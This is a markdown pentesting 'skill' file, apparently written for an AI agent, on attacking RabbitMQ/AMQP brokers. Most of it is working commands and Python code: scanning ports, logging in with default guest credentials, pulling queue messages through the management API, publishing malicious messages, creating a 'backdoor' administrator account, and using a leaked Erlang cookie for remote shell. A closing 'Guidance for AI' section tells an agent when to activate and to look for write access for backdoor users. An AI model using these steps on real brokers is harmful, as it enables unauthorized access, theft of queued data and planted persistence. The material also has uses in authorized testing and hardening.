# AMQP/RabbitMQ Pentesting Skill

## Goal

Identify and exploit vulnerabilities in AMQP message brokers like RabbitMQ.

## Ports

- **5672** - AMQP (default)
- **5671** - AMQP over TLS
- **15672** - Management HTTP API
- **25672** - Erlang distribution

## Methodology

1. **Identify Service:** Scan for AMQP and management ports
2. **Check Defaults:** Test default credentials
3. **Enumerate Queues:** List exchanges, queues, and bindings
4. **Access Messages:** Read/consume messages from queues
5. **Exploit Access:** Publish malicious messages or escalate

## Enumeration

```bash
# Nmap scan
nmap -sV -p 5672,5671,15672,25672 <target>

# Check management interface
curl -u guest:guest http://<target>:15672/api/overview
```

## Default Credentials

```
# RabbitMQ defaults
Username: guest
Password: guest

# Note: guest user typically only works from localhost
# But misconfigured servers may allow remote access
```

## Management API Exploitation

```bash
# List users
curl -u guest:guest http://<target>:15672/api/users

# List vhosts
curl -u guest:guest http://<target>:15672/api/vhosts

# List queues
curl -u guest:guest http://<target>:15672/api/queues

# List connections
curl -u guest:guest http://<target>:15672/api/connections

# Get messages from queue
curl -u guest:guest -X POST \
  -H "Content-Type: application/json" \
  -d '{"count":10,"ackmode":"ack_requeue_true","encoding":"auto"}' \
  http://<target>:15672/api/queues/<vhost>/<queue>/get
```

## Creating Admin User

```bash
# If write access to API
curl -u guest:guest -X PUT \
  -H "Content-Type: application/json" \
  -d '{"password":"hacked","tags":"administrator"}' \
  http://<target>:15672/api/users/backdoor
```

## AMQP Client Access

```python
import pika

# Connect
credentials = pika.PlainCredentials('guest', 'guest')
connection = pika.BlockingConnection(
    pika.ConnectionParameters('<target>', 5672, '/', credentials)
)
channel = connection.channel()

# Consume messages
def callback(ch, method, properties, body):
    print(f"Received: {body}")

channel.basic_consume(queue='target_queue', on_message_callback=callback, auto_ack=True)
channel.start_consuming()
```

## Message Publishing

```python
# Publish malicious message
channel.basic_publish(
    exchange='',
    routing_key='target_queue',
    body='{"payload": "malicious"}'
)
```

## Erlang Cookie Exploitation

```bash
# Erlang distribution port (25672)
# If cookie is known/leaked, full shell access possible

# Cookie location
/var/lib/rabbitmq/.erlang.cookie
~/.erlang.cookie

# Connect with erl
erl -name attacker@attacker -setcookie <cookie>
# Then: net_adm:ping('rabbit@target').
# Followed by shell execution on remote node
```

## Tools

* **curl** - API interaction
* **pika** - Python AMQP client
* **rabbitmqctl** - RabbitMQ CLI (local)
* **amqp-tools** - CLI AMQP utilities

## Guidance for AI

* Activate when port 5672 or 15672 is open
* guest:guest is default but often restricted to localhost
* Management API (15672) reveals full broker info
* Queue messages may contain sensitive data
* Erlang cookie leakage allows RCE via distributed protocol
* Check for write access to create backdoor users
